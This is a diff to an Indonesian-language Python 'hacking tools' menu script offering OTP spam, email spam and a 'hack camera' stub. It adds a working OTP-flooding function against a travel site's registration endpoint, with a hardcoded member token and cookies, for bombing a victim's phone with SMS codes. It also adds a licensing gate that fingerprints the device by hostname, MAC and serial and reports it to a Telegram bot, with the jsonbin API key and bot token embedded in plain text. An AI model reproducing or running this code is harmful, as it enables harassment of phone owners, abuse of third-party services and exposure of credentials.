@@ -13,8 +13,11 @@ import base64
 import uuid
 import phonenumbers
 import subprocess
+import hashlib
+import socket
+import platform
 from phonenumbers import geocoder, carrier, timezone as phone_timezone
-from datetime import datetime
+from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse, quote, unquote
 from colorama import Fore, Back, init
@@ -51,6 +54,143 @@ def check_update():
         print("[ ! ] Gagal cek update (tidak ada koneksi / repo error). Lanjut pakai versi lokal.\n")
     except FileNotFoundError:
         print("[ ! ] Git tidak ditemukan. Pastikan git sudah terinstall.\n")
+
+#verifikasi
+
+BIN_ID = "6a3d4903f5f4af5e292f90a2"
+API_KEY = "$2a$10$4gbqxuXokCDoZMYOwZlbYuyijfoDoxLMXwMwVddeTCLWgNkoPF.za"
+ACCESS_KEY = "MIKASA_UID"
+BOT_TOKEN = "8685515038:AAEW_N4J98oYLIMpP71Fc9W99ha7nR4mJAs"
+ADMIN_ID = "8873967955"
+
+def get_uid():
+    try:
+        identifiers = []
+        identifiers.append(socket.gethostname())
+        mac = subprocess.check_output(['cat', '/sys/class/net/wlan0/address'], stderr=subprocess.DEVNULL).decode().strip()
+        identifiers.append(mac)
+        serial = subprocess.check_output(['getprop', 'ro.serialno'], stderr=subprocess.DEVNULL).decode().strip()
+        identifiers.append(serial)
+        if not any(identifiers):
+            identifiers.append(str(uuid.getnode()))
+        raw = ''.join(identifiers)
+        return hashlib.sha256(raw.encode()).hexdigest()[:16]
+    except:
+        return hashlib.sha256(str(uuid.getnode()).encode()).hexdigest()[:16]
+
+def load_database():
+    try:
+        url = f"https://api.jsonbin.io/v3/b/{BIN_ID}/latest"
+        headers = {"X-Master-Key": API_KEY, "X-Access-Key": ACCESS_KEY}
+        resp = requests.get(url, headers=headers, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            return data.get("record", {})
+        return None
+    except:
+        return None
+
+def save_database(data):
+    try:
+        url = f"https://api.jsonbin.io/v3/b/{BIN_ID}"
+        headers = {"X-Master-Key": API_KEY, "X-Access-Key": ACCESS_KEY, "Content-Type": "application/json"}
+        resp = requests.put(url, json=data, headers=headers, timeout=10)
+        return resp.status_code == 200
+    except:
+        return False
+
+def cek_uid(uid):
+    db = load_database()
+    if not db:
+        return None, None
+    users = db.get("users", [])
+    for user in users:
+        if user.get("uid") == uid:
+            return True, user
+    return False, None
+
+def kirim_notif_telegram(uid, username):
+    try:
+        pesan = f"""
+🔑 REGISTRASI UID BARU
+
+🆔 UID: `{uid}`
+👤 Username: `{username}`
+📱 Device: {platform.system()} {platform.release()}
+🕐 Waktu: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}
+
+Untuk mendaftarkan, tambahkan ke database:
+uid: {uid}
+nama: {username}
+status: active
+"""
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {"chat_id": ADMIN_ID, "text": pesan, "parse_mode": "Markdown"}
+        requests.post(url, json=payload, timeout=10)
+        return True
+    except:
+        return False
+
+def register_user(uid, username):
+    db = load_database()
+    if db is None:
+        db = {"users": []}
+    for user in db.get("users", []):
+        if user.get("uid") == uid:
+            return False, "UID sudah terdaftar!"
+    new_user = {
+        "uid": uid,
+        "nama": username,
+        "status": "pending",
+        "registered": datetime.now().isoformat(),
+        "expiry": (datetime.now() + timedelta(days=30)).isoformat()
+    }
+    db["users"].append(new_user)
+    if save_database(db):
+        kirim_notif_telegram(uid, username)
+        return True, "User berhasil didaftarkan! Tunggu aktivasi admin."
+    return False, "Gagal menyimpan database!"
+
+def menu_uid():
+    os.system('clear')
+    uid = get_uid()
+    print(f"""
+{Y}┌─────────────────────────────────────────────────────────────┐
+{Y}│{W}              🔐 SISTEM REGISTRASI UID                     {Y}│
+{Y}├─────────────────────────────────────────────────────────────┤
+{Y}│{W}  UID Device   : {G}{uid}{W}                                  {Y}│
+{Y}│{W}  Status       : {R}Belum Terdaftar{W}                         {Y}│
+{Y}├─────────────────────────────────────────────────────────────┤
+{Y}│{W}  Silakan daftar dengan membuat username                   {Y}│
+{Y}│{W}  Username harus 3-12 karakter, tanpa spasi               {Y}│
+{Y}├─────────────────────────────────────────────────────────────┤
+{Y}│{Y}  [1] Daftar UID baru                                     {Y}│
+{Y}│{Y}  [2] Coba lagi (refresh)                                 {Y}│
+{Y}│{Y}  [0] Keluar                                              {Y}│
+{Y}└─────────────────────────────────────────────────────────────┘{N}
+""")
+    pilihan = input(f"{W}└─{R}${N} ").strip()
+    if pilihan == "0":
+        sys.exit(0)
+    elif pilihan == "1":
+        print(f"\n{W}Masukkan username (tanpa spasi, 3-12 karakter):{N}")
+        username = input(f"{W}└─{R}${N} ").strip()
+        if not username or len(username) < 3 or len(username) > 12 or " " in username:
+            print(f"{R}❌ Username tidak valid!{N}")
+            time.sleep(2)
+            return menu_uid()
+        success, msg = register_user(uid, username)
+        if success:
+            print(f"{G}✅ {msg}{N}")
+            print(f"{Y}⏳ Tunggu aktivasi dari admin...{N}")
+            input(f"{W}Tekan Enter untuk keluar...{N}")
+            sys.exit(0)
+        else:
+            print(f"{R}❌ {msg}{N}")
+            time.sleep(2)
+            return menu_uid()
+    else:
+        return menu_uid()
 
 # ===================== WARNA =====================
 R = '\033[1;31m'
@@ -98,6 +238,10 @@ def get_date():
 
 # ===================== BANNER =====================
 def print_banner(user, date):
+    uid = get_uid()
+    status, _ = cek_uid(uid)
+    status_text = f"{G}ACTIVE{W}" if status else f"{R}PENDING{W}"
+    
     print(f"""
 {R}╔═╗╔═╦══╦╗╔═╦═══╦═══╦═══╗
 {R}║║╚╝║╠╣╠╣║║╔╣╔═╗║╔═╗║╔═╗║
@@ -107,10 +251,13 @@ def print_banner(user, date):
 {R}╚╝╚╝╚╩══╩╝╚═╩╝─╚╩═══╩╝─╚╝{N}
 
 {R}─────────────────────────────────────────────────────────────{N}
-{R}  {W}Author {N}›{W} Rulzz   Tools {N}›{W} 15   User {N}›{W} {user}{N}
-{R}  {W}Date  {N}›{W} {date}{N}   {W}Version{N}›{W}1.0.0{N}
+{R}  {W}UID   : {C}{uid}{N}
+{R}  {W}Status: {status_text}{N}
+{R}  {W}Author: {G}Rulzz{N}   Tools: {G}15{N}
+{R}  {W}Date  : {G}{date}{N}
+{R}  {W}Version: {G}1.0.0{N}
 {R}─────────────────────────────────────────────────────────────{N}
-
+                           M E N U
 {R}─────────────────────────────────────────────────────────────{N}
 {R}  {W}01{N} OTP SPAM     {W}02{N} HACK-CAMERA  {W}03{N} OSINT{N}
 {R}  {W}04{N} EMAIL SPAM   {W}05{N} DECODER      {W}06{N} ENCRYPTOR{N}
@@ -674,6 +821,51 @@ def tool_otp_spam():
         return resp.status_code < 400
      except:
         return False
+        
+    def spam_otp_misteraladin(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor[2:]
+        else:
+            nomor_lokal = nomor
+        
+        session = requests.Session()
+        url = "https://m.misteraladin.com/api/members/v2/otp/request"
+        
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
+            'Accept': "application/json, text/plain, */*",
+            'Accept-Encoding': "gzip, deflate, br",
+            'Content-Type': "application/json",
+            'x-platform': "mobile-web",
+            'x-member-token': "8cf04f4cf630b73e5ff81d6ec798a129da9a899fc2923afa1faf3cb943bb62ca",
+            'authorization': "",
+            'sec-ch-ua-platform': '"Android"',
+            'x-request-time': str(int(time.time())),
+            'accept-language': "id",
+            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+            'sec-ch-ua-mobile': "?1",
+            'origin': "https://m.misteraladin.com",
+            'sec-fetch-site': "same-origin",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-dest': "empty",
+            'referer': "https://m.misteraladin.com/account",
+            'priority': "u=1, i",
+            'Cookie': "_cfuvid=Y=NSmHE.f_IY=wf490spz3OaatNmaSPXSFaZSB72YWU-1780207406.1363122-1.0.1.1-xHMLbECgkrSfUPHWmHlqC0JUETysvOwDakcgDtG_EKQ; _ga=GA1.2.1474932703.1780207411; _gid=GA1.2.717120459.1780207411; _gat=1; _tt_enable_cookie=1; _ttp=01KSYA2RQQFR7BJFPHJ048FE3W_.tt.1; _gcl_au=1.2.433562123.1780207413; _ga_PLKRYTK7YG=GS2.2.s1780207412$o1$g1$t1780207413$j59$l0$h0; G_ENABLED_IDPS=google; ttcsid_C9BS9SBC77UC6ALAKSC0=1780207411986::L2HdYjCd4N7u-cdS8n4M.1.1780207444744.1; ttcsid=1780207411989::=-JmQwD98Wk95Gqtu2n9.1.1780207444744.0::1.1672.0::32685.10.375.365::0.0.0"
+        }
+        
+        payload = {
+            "phone_number_country_code": "62",
+            "phone_number": nomor_lokal,
+            "type": "register"
+        }
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
 
     while True:
 
@@ -690,7 +882,8 @@ def tool_otp_spam():
             "10": spam_otp_bliblitiket,
             "11": spam_otp_matahari,
             "12": spam_otp_rumah123,
-            "13": spam_otp_halodoc
+            "13": spam_otp_halodoc,
+            "14": spam_otp_misteraladin
         }
         
         hasil = {}
@@ -755,8 +948,8 @@ def tool_otp_spam():
     
 def tool_Hack_camera():
     os.system('clear')
-    print(f"{Y}[!] SMS Spammer - Dalam pengembangan{N}")
-    input("Tekan ENTER untuk kembali...")
+    print(f"{Y}[!] HACK CAMERA - Dalam pengembangan{N}")
+    input("Tekan ENTER...")
 
 def tool_osint():
     os.system('clear')
